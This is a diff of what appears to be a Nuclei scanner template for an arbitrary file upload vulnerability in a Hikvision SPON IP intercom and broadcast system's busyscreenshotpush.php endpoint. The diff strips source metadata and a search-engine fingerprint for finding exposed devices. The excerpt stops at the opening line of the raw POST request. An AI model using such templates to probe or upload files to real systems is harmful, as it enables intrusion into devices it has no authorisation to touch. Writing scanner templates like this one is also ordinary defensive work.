@@ -3,14 +3,8 @@ info:
   name: 海康威视SPONIP网络对讲广播系统busyscreenshotpush存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/57f7775b96e32ff0de58420526762d64
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 57f7775b96e32ff0de58420526762d64
-    fofa: + Hunter：`web.body="vendors/custom/html5.min.js"`
 http:
 - raw:
   - 'POST /php/busyscreenshotpush.php HTTP/1.1
